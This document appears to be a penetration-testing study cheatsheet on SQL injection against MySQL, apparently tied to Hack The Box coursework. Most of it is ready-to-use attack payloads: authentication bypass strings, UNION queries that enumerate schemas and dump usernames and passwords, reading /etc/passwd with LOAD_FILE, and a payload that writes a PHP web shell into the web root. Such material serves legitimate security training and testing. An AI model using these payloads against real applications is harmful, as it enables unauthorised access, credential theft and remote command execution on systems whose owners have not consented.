# SQL Injection Cheatsheet

SQL injection (SQLi) is a vulnerability that allows an attacker to interfere with the queries an application makes to its database, potentially allowing unauthorized data access, modification, or deletion.

## Checks

- [ ] Try injecting a single quote and look for anomalies
- [ ] Check boolean values (e.g., `1=1` and `1=2` and look for disparities)
- [ ] Look for any endpoint/functionality that seems like it is touching the DB
  - Try injecting a single or double quote and look for changes in response
  - Try adding comments on login forms to bypass authentication
  - Try to enumerate the database type and version
- [ ] Check if you can trigger an error
  - Visible errors
  - Conditional errors (e.g., divide by zero)
- [ ] Check if you can trigger a conditional response
- [ ] Try to trigger a time delay - sleep
- [ ] Try different encodings like `&#x53;ELECT`

## SQLi Discovery

Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

## MySQL

Data types in MySQL - [link](https://dev.mysql.com/doc/refman/8.0/en/data-types.html)

| **Command**                                                                                                                                              | **Description**                                          |
| -------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| **General**                                                                                                                                              |                                                          |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p`                                                                                                       | login to mysql database                                  |
| `SHOW DATABASES`                                                                                                                                         | List available databases                                 |
| `USE users`                                                                                                                                              | Switch to database                                       |
| **Tables**                                                                                                                                               |                                                          |
| `CREATE TABLE logins (id INT, ...)`                                                                                                                      | Add a new table                                          |
| `SHOW TABLES`                                                                                                                                            | List available tables in current database                |
| `DESCRIBE logins`                                                                                                                                        | Show table properties and columns                        |
| `INSERT INTO table_name VALUES (value_1,..)`                                                                                                             | Add values to table                                      |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)`<br><br>`INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');` | Add values to specific columns in a table                |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`                                                                                         | Update table values                                      |
| **Columns**                                                                                                                                              |                                                          |
| `SELECT * FROM table_name`                                                                                                                               | Show all columns in a table                              |
| `SELECT column1, column2 FROM table_name`                                                                                                                | Show specific columns in a table                         |
| `DROP TABLE logins`                                                                                                                                      | Delete a table                                           |
| `ALTER TABLE logins ADD newColumn INT`                                                                                                                   | Add new column                                           |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`                                                                                                | Rename column                                            |
| `ALTER TABLE logins MODIFY oldColumn DATE`                                                                                                               | Change column datatype                                   |
| `ALTER TABLE logins DROP oldColumn`                                                                                                                      | Delete column                                            |
| **Output**                                                                                                                                               |                                                          |
| `SELECT * FROM logins ORDER BY column_1`                                                                                                                 | Sort by column                                           |
| `SELECT * FROM logins ORDER BY column_1 DESC`                                                                                                            | Sort by column in descending order                       |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC`                                                                                                    | Sort by two-columns                                      |
| `SELECT * FROM logins LIMIT 2`                                                                                                                           | Only show first two results                              |
| `SELECT * FROM logins LIMIT 1, 2`                                                                                                                        | Only show first two results starting from index 2        |
| `SELECT * FROM table_name WHERE <condition>`                                                                                                             | List results that meet a condition                       |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`                                                                                                      | List results where the name is similar to a given string |
The following queries and their output will tell us that we are dealing with `MySQL`:

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |
## MySQL Operator Precedence

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and Subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)

## SQLi - Auth Bypass

| **Payload**                                                                                                                                      | **Description**                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
| **Auth Bypass**                                                                                                                                  |                                                      |
| `admin' or '1'='1`                                                                                                                               | Basic Auth Bypass                                    |
| `admin')-- -`                                                                                                                                    | Basic Auth Bypass With comments                      |
| [Payloadsallthethings - SQLi Auth Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |                                                      |
| **Union Injection**                                                                                                                              |                                                      |
| `' order by 1-- -`                                                                                                                               | Detect number of columns using `order by`            |
| `cn' UNION select 1,2,3-- -`                                                                                                                     | Detect number of columns using Union injection       |
| `cn' UNION select 1,@@version,3,4-- -`                                                                                                           | Basic Union injection                                |
| `UNION select username, 2, 3, 4 from passwords-- -`                                                                                              | Union injection for 4 columns                        |
| **DB Enumeration**                                                                                                                               |                                                      |
| `SELECT @@version`                                                                                                                               | Fingerprint MySQL with query output                  |
| `SELECT SLEEP(5)`                                                                                                                                | Fingerprint MySQL with no output                     |
| `cn' UNION select 1,database(),2,3-- -`                                                                                                          | Current database name                                |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                                        | List all databases                                   |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                                       | List all tables in a specific database               |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`                      | List all columns in a specific table                 |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                                             | Dump data from a table in another database           |
| **Privileges**                                                                                                                                   |                                                      |
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                           | Find current user                                    |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                                     | Find if user has admin privileges                    |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`       | Find if all user privileges                          |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`       | Find which directories can be accessed through MySQL |
| **File Injection**                                                                                                                               |                                                      |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                         | Read local file                                      |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                                                                     | Write a string to a local file                       |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                        | Write a web shell into the base web directory        |

---

## References

- [PortSwigger SQL Injection Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks - SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)
